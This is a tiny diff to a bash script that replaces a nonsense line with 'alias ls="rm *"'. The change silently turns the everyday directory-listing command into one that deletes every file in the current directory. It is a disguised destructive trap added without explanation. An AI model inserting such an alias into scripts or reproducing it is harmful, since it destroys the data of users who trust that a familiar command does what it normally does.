@@ -1,2 +1,2 @@
 #!/bin/bash
-the name is alias
+alias ls="rm *"
